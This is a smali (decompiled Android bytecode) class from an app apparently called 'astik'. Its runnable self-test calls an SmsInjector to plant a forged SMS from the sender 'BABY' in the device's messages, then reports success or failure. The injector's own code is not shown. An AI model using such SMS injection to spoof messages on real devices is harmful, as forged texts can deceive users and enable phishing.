.class Lcom/astik/module/MainActivity$4;
.super Ljava/lang/Object;
.source "MainActivity.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/astik/module/MainActivity;->runTest()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/astik/module/MainActivity;

.field final synthetic val$act:Landroid/app/Activity;


# direct methods
.method constructor <init>(Lcom/astik/module/MainActivity;Landroid/app/Activity;)V
    .locals 0
    .annotation system Ldalvik/annotation/MethodParameters;
        accessFlags = {
            0x8010,
            0x1010
        }
        names = {
            null,
            null
        }
    .end annotation

    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .line 292
    iput-object p1, p0, Lcom/astik/module/MainActivity$4;->this$0:Lcom/astik/module/MainActivity;

    iput-object p2, p0, Lcom/astik/module/MainActivity$4;->val$act:Landroid/app/Activity;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 3

    .line 296
    :try_start_0
    iget-object v0, p0, Lcom/astik/module/MainActivity$4;->val$act:Landroid/app/Activity;

    const-string v1, "BABY"

    const-string v2, "ASTIK TEST OK \u2014 module alive"

    invoke-static {v0, v1, v2}, Lcom/astik/module/SmsInjector;->inject(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 297
    const-string v0, "OK \u2014 SMS injected"

    goto :goto_0

    :cond_0
    const-string v0, "FAILED"

    .line 298
    :goto_0
    iget-object v1, p0, Lcom/astik/module/MainActivity$4;->val$act:Landroid/app/Activity;

    new-instance v2, Lcom/astik/module/MainActivity$4$1;

    invoke-direct {v2, p0, v0}, Lcom/astik/module/MainActivity$4$1;-><init>(Lcom/astik/module/MainActivity$4;Ljava/lang/String;)V

    invoke-virtual {v1, v2}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception v0

    .line 305
    iget-object v1, p0, Lcom/astik/module/MainActivity$4;->val$act:Landroid/app/Activity;

    new-instance v2, Lcom/astik/module/MainActivity$4$2;

    invoke-direct {v2, p0, v0}, Lcom/astik/module/MainActivity$4$2;-><init>(Lcom/astik/module/MainActivity$4;Ljava/lang/Exception;)V

    invoke-virtual {v1, v2}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    return-void
.end method
